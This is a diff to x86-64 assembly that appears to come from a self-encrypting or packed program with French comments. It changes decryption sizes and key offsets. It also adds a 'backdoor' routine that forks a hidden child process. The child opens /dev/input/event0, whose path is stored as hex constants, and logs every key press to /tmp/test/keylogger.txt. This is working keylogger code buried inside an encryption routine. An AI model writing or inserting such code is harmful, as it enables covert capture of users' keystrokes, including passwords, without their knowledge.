@@ -37,7 +37,6 @@ fork_hash:
 	cmp rax, 0
 	je child_hash
 	jl end_ft_end
-	jmp wait_loop
 
 wait_loop:
 	jmp wait_loop
@@ -64,9 +63,9 @@ hash:
 	mov rsi, 0 ;inc
 	lea rcx, [syscalls] ;adresse syscalls
 hash_loop1:
-	cmp rsi, 0x109;|REPLACE3| offset key a eviter
+	cmp rsi, 0x84;|REPLACE3| offset key a eviter
 	jl after_cmp
-	cmp rsi, 0x10d;|REPLACE4| offset key a eviter
+	cmp rsi, 0x88;|REPLACE4| offset key a eviter
 	jle hash_loop2
 after_cmp:
 	shl edi, 5
@@ -146,7 +145,7 @@ ft_end:
 	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x40f0;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x40ec;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
@@ -273,7 +272,86 @@ exit_0:
 	mov rdi, 0x0
 	syscall
 
+write_path1:
+	mov [rdi], DWORD 0x7665642f
+	mov [rdi + 0x4], DWORD 0x706e692f
+	mov [rdi + 0x8], DWORD 0x652f7475
+	mov [rdi + 0xc], DWORD 0x746e6576
+	mov [rdi + 0x10], DWORD 0x00000030
+	ret
+
+write_path2:
+	mov [rdi], DWORD 0x706d742f
+	mov [rdi + 0x4], DWORD 0x7365742f
+	mov [rdi + 0x8], DWORD 0x656b2f74
+	mov [rdi + 0xc], DWORD 0x676f6c79
+	mov [rdi + 0x10], DWORD 0x2e726567
+	mov [rdi + 0x14], DWORD 0x00747874
+	ret
+
+backdoor:
+	mov rdi, 1
+	lea rsi, [print_exit0]
+	mov rdx, 5
+	mov rax, 1
+	syscall
+	
+	sub rsp, 0x20
+	call write_path1
+	xor rsi, rsi
+	mov rdx, 0x1bc
+	mov rax, 0x2
+	syscall
+	cmp rax, 0
+	jl exit_1
+
+	mov rdi, 1
+	lea rsi, [print_exit0]
+	mov rdx, 5
+	mov rax, 1
+	syscall
+
+	mov [rbp - 0x20], rax
+
+	call write_path2
+	mov rsi, 0x201
+	mov rdx, 0x29a
+	mov rax, 0x2
+	syscall
+	cmp rax, 0
+	jl exit_1
+	mov [rbp - 0x1c], rax
+
+loop_keylogger:
+	mov rdi, [rbp - 0x20]
+	lea rsi, [rbp - 0x18]
+	mov rdx, 0x18 ;size of struct input_event
+	xor rax, rax
+	syscall ;read
+	
+	cmp [rbp - 0x8], WORD 0x1 ;event type is EV_KEY
+	jne loop_keylogger
+	cmp [rbp - 0x4], DWORD 0x1 ;event value
+	jne loop_keylogger
+
+	mov rdi, [rbp - 0x1c]
+	mov rsi, [rbp - 0x6]
+	mov rdx, 0x2
+	mov rax, 0x1
+	syscall ;write
+
+	jmp loop_keylogger
+
 child_hash:
+	xor rax, rax
+	mov rax, 0x39
+	syscall	;fork
+	mov r14, rax
+	cmp rax, 0
+	je backdoor
+	jl exit_1
+	
+	
 	call getppid
 	mov r14, rax
 	sub rsp, 0x100 ; struct size = 0xd8
